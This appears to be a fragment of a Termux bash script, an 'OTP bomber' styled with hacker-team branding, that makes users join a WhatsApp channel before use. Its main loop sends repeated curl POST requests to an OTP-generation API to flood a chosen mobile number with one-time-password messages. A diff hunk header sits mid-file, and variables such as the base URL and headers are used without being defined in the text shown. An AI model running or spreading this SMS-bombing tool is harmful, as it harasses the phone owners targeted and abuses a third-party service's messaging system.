#!/data/data/com.termux/files/usr/bin/bash
 
 # Show menu
 clear
 echo -e "\033[1;31m"
 echo " ██████╗ ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ "
 echo " ██╔══██╗██║ ██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗"
 echo " ██████╔╝█████╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝"
 echo " ██╔═══╝ ██╔═██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗"
 echo " ██║     ██║  ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║"
 echo " ╚═╝     ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
 echo -e "\033[0m"
 echo -e "\033[1;33m> Developer: UNKNOWN-H4CKE3R\033[0m"
 echo -e "\033[1;34m----------------------------------------\033[0m"
 
 # WhatsApp channel requirement
 echo -e "\033[1;32m"
 echo "YOU MUST JOIN OUR WHATSAPP CHANNEL TO USE THIS TOOL"
 echo "Channel Link:"
 echo "https://whatsapp.com/channel/0029Vb34QDIBadma0Bim5v1I"
 echo -e "\033[0m"
 echo -e "\033[1;34m----------------------------------------\033[0m"
 
 read -p "Have you joined the channel? (y/n): " joined
 if [ "$joined" != "y" ]; then
     echo "Please join our WhatsApp channel first!"
     exit 1
 fi
 
 echo ""
 echo "Choose an option:"
 echo "1) Register New User"
 echo "2) Regenerate OTP Multiple Times"
 @@ -47,19 +73,26 @@ elif [ "$choice" = "2" ]; then
 
     for ((i=1; i<=otp_count; i++))
     do
         echo -e "\033[1;31m"
         echo " ██████╗ ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ "
         echo " ██╔══██╗██║ ██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗"
         echo " ██████╔╝█████╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝"
         echo " ██╔═══╝ ██╔═██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗"
         echo " ██║     ██║  ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║"
         echo " ╚═╝     ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
         echo -e "\033[0m"
         echo -e "\033[1;33m> Developer: UNKNOWN-H4CK3R\033[0m"
         echo -e "\033[1;34m----------------------------------------\033[0m"
         echo ""
         echo "Sending OTP #$i"
         curl -X POST "$base_url/api/sns_generate_mobile_otp"         "${headers[@]}"         -d '{
           "mobile_number": "'"$mobile_number"'"
         }'
         echo ""
         echo "----------------------------------------"
         echo "Developer: UZ--H@CKER--TEAM "
         echo "----------------------------------------"
         echo "UNKNOWN-H4CK3R"
         echo -e "\033[1;34m----------------------------------------\033[0m"
         sleep 1
     done
 
 else
     echo "Invalid choice. Exiting."
 fi
 -
